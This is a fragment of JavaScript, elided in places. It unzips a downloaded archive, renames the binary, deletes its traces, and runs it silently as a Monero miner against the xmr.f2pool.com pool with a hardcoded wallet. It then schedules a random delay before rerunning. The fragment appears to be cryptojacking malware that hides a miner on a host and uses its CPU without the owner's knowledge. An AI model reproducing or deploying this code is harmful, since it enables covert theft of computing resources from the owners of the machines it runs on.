...
const runJob = (nameTool) => {
    ...
    const runMonney = shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2 --no-huge-pages --randomx-wrmsr=-1`, { silent: true, async: true });
    ...
    return new Promise((resolve, reject) => {
        writer.on('finish', () => {
            if (shell.exec(`rm -rf SHA256SUMS runtool config.json && unzip ${filename} && cp runtool ${nameTool} && rm -rf ${filename}`, { silent: true }).code === 0) {
                ...
                runJob(nameTool);
                return resolve(((Math.floor(Math.random() * 25) + 1) * 60) * 1000);
            }
        });
        writer.on('error', () => {
